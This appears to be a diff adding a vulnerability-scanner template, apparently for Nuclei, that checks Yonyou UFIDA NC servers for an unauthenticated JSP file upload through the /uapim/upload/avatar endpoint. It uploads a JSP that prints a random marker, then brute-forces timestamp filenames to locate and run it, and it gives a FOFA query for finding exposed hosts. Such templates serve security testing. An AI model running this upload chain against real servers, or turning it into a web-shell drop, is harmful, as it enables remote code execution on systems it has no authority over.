@@ -1,0 +1,75 @@
+id: yonyou-nc-avatar-fileupload
+
+info:
+  name: 用友 UFIDA NC avatar - fileupload
+  author: 天澜实验室
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,fileupload,oa
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+  usercode: "{{to_lower(rand_base(4))}}"
+  rand: "{{to_lower(rand_base(5))}}"
+
+flow: |
+  
+  if(http(1)==true){
+      log("存在漏洞开始爆破")
+      var dateObject = new Date(template["uploadtime"]);
+
+      startTime = dateObject.getTime()
+
+      for (var i = 0; i < 1000; i++) {
+
+          var currentTime = startTime + i;
+          set("currentTime",currentTime)
+          if(http(2)===true){
+            break
+          }
+      }
+  }
+  
+http:
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode={{usercode}}&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+        Accept-Encoding: gzip
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="uploadedfile"; filename="{{filename}}.jsp"
+
+        <%out.print("{{rand}}");%>
+        ------{{boundary}}--
+
+
+    extractors:
+      - type: kval
+        part: header
+        internal: true
+        name: uploadtime
+        kval:
+          - Date
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'true')"
+
+  - raw:
+      - |
+        GET /uapim/static/pages/photo/{{usercode}}/{{usercode}}.{{currentTime}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '{{rand}}')"
